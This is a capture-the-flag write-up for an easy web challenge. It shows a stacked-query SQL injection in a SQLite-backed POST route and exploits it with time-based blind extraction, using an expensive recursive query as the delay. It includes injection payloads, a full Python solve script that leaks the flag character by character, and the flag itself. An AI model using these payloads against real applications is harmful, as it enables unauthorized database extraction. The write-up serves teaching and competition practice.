# Web - I'm a Spy AMA
**Author**: jvvan  
**Difficulty**: Easy  
**Description**: Can you ask the right questions to get the flag?  

**Flag**: `SCC{4_5py_n3v3r_r3v34l5_h15_53cr37s}`

# Writeup

We can see that the POST route is vulnerable to SQL injection.

```sql
'); (SQL HERE) --
```

We can't return anything as the result of the query is not returned to us. However, we can use a timing attack to guess the flag.
We can check the flag character by character by sleeping for some time if the character is correct.

```sql
'); SELECT CASE WHEN EXISTS(SELECT 1 FROM questions WHERE question LIKE 'SCC{x%') THEN (SLEEP) ELSE 1 END; --
```

SQLite does not have a built in sleep function, but we can just run an expensive query to slow down the response time. Something like works:

```sql;
WITH RECURSIVE
  counter(x) AS (
    SELECT 1
    UNION ALL
    SELECT x + 1 FROM counter
    LIMIT 10000000
  )
SELECT count(*) FROM counter;
```

We also need to escape `_` and disable case insensitivity for the `LIKE` operator.

Full solve script:

```python
import requests
import time

target_url = "http://localhost:3000"

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_}"

prefix = "SCC{"
delay_threshold = 1

while True:
    found_char = False
    for ch in alphabet:
        injection = (
            "');PRAGMA case_sensitive_like = ON;SELECT CASE WHEN EXISTS("
            "SELECT 1 FROM questions WHERE question LIKE '{}\{}%' ESCAPE '\\') "
            "THEN (SELECT count(*) FROM (WITH RECURSIVE counter(x) AS "
            "(SELECT 1 UNION ALL SELECT x+1 FROM counter LIMIT 10000000) "
            "SELECT count(*) FROM counter)) ELSE 1 END;--"
        ).format(prefix, ch)

        data = {"question": injection}
        start_time = time.time()
        try:
            response = requests.post(target_url, data=data)
        except Exception as e:
            print("Request error:", e)
            continue
        elapsed = time.time() - start_time

        print(f"Trying '{prefix}{ch}' -> response time: {elapsed:.2f} sec")
        if elapsed > delay_threshold:
            prefix += ch
            print(f"new prefix is '{prefix}'")
            found_char = True
            break

    if not found_char:
        break

print("Final flag:", prefix)
```